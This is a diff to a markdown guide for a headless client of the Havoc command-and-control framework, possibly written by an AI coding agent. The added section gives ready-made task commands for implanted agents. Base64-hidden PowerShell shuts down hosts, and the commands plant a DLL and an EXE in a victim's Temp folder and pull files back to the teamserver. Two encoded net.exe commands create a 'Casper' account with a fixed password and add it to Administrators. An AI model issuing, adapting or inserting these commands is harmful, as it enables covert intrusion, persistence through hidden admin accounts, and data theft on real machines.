@@ -51,6 +51,56 @@ When replicating higher-level console actions (such as `shell`), translate the Q
 
 That format mirrors `CommandExecute::ProcModule` inside the Qt source. `ProcCommand=4` selects the “create process” branch and the trailing base64 value (`L2Mgd2hvYW1p`) is the encoded `/c whoami` argument block that the demon expects. Use the other helpers in `client/src/Havoc/Demon/CommandSend.cc` as a reference when you script additional task types. 【F:client/src/Havoc/Demon/ConsoleInput.cc†L856-L877】【F:client/src/Havoc/Demon/CommandSend.cc†L284-L315】
 
+## Common command translations
+
+The Qt console also hides a fair amount of bookkeeping when it fires Python modules or file-system helpers. The headless CLI can reproduce the same behaviour, but you must expand the high-level command into the raw task payload yourself. Replace `<agent-id>` with the demon identifier shown by the `agents` command.
+
+### PowerShell one-liners
+
+Use the process module (`CommandID 0x1010`) with `ProcCommand=4`. The `Args` field must contain the literal string `0;FALSE;TRUE;` followed by the PowerShell path and a base64-encoded command line. The examples below mirror the Qt client’s `powershell` helper.
+
+```text
+task <agent-id> 0x1010 powershell ProcCommand=4 Args=0;FALSE;TRUE;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe;LUMgW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEVudmlyb25tZW50VmFyaWFibGUoIlBhdGgiLCAiTWFjaGluZSIp
+task <agent-id> 0x1010 powershell ProcCommand=4 Args=0;FALSE;TRUE;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe;LUMgW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEVudmlyb25tZW50VmFyaWFibGUoIlBhdGgiLCAiVXNlciIp
+task <agent-id> 0x1010 powershell ProcCommand=4 Args=0;FALSE;TRUE;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe;LUMgU3RvcC1Db21wdXRlcg==
+```
+
+The three commands above retrieve the machine `PATH`, the user `PATH`, and issue `Stop-Computer`, respectively.
+
+### File uploads and downloads
+
+File operations use `CommandID 15` (`COMMAND_FS`). Supply a `SubCommand` string and the encoded `Arguments` value that the demon expects. Paths are UTF-8 strings encoded with base64, matching the GUI implementation in `CommandExecute::FS` and the server-side translation in `teamserver/pkg/agent/demons.go`.
+
+```text
+# Upload local DLL to %LOCALAPPDATA%\Temp
+task <agent-id> 15 upload SubCommand=upload Arguments=QzpcXFVzZXJzXFxBbGljZSBNYWxpY2VcXEFwcERhdGFcXExvY2FsXFxUZW1wXFxXcHRzRXh0ZW5zaW9ucy5kbGw=<base64-data>
+
+# Upload local EXE to %LOCALAPPDATA%\Temp
+task <agent-id> 15 upload SubCommand=upload Arguments=QzpcXFVzZXJzXFxBbGljZSBNYWxpY2VcXEFwcERhdGFcXExvY2FsXFxUZW1wXFxzdW1tb24uZXhl<base64-data>
+
+# Download individual files from C:\
+task <agent-id> 15 download SubCommand=download Arguments=Qzpcc2FtYW50aGEudHh0
+task <agent-id> 15 download SubCommand=download Arguments=Qzpcc3lzdGVtaWMudHh0
+task <agent-id> 15 download SubCommand=download Arguments=Qzpcc2VjdXJpdHkudHh0
+```
+
+Replace `<base64-data>` with the base64-encoded contents of the file you want to upload (for example, `base64 -w0 /home/kali/WptsExtensions.dll`). When you queue a download the server streams the file back through the standard transfer channel, exactly as if you had used the GUI.
+
+### Local account management
+
+The GUI wraps module logic around simple PowerShell or `net.exe` commands. From the headless client you can reuse the PowerShell pattern from above to create a user and add it to the Administrators group. For example:
+
+```text
+task <agent-id> 0x1010 powershell ProcCommand=4 Args=0;FALSE;TRUE;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe;bmV0IHVzZXIgQ2FzcGVyIElhbUFHaG9zdDEyMzQ1ISEhIC9hZGQ=
+task <agent-id> 0x1010 powershell ProcCommand=4 Args=0;FALSE;TRUE;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe;bmV0IGxvY2FsZ3JvdXAgQWRtaW5pc3RyYXRvcnMgQ2FzcGVyIC9hZGQ=
+```
+
+These two tasks create the `Casper` account with the provided password and add it to the local Administrators group. Swap in any other account-management one-liners you prefer (for example `New-LocalUser` / `Add-LocalGroupMember`).
+
+### About Python modules
+
+Qt modules such as `samdump` run inside the GUI process and emit whatever low-level tasks the demon needs. The headless CLI does not embed the Python runtime, so module commands are unavailable unless you port their implementation into your automation. Use the C++ helpers referenced above to see which raw tasks a given module sends before recreating it in Go, Python, or another scripting language.
+
 ## 1. Understand the Transport
 
 * The Qt client connects to the teamserver over a WebSocket endpoint at `wss://<host>:<port>/havoc/` and ignores TLS validation errors. The same URI and TLS behaviour must be reproduced by the headless client. 【F:client/src/Havoc/Connector.cc†L10-L44】
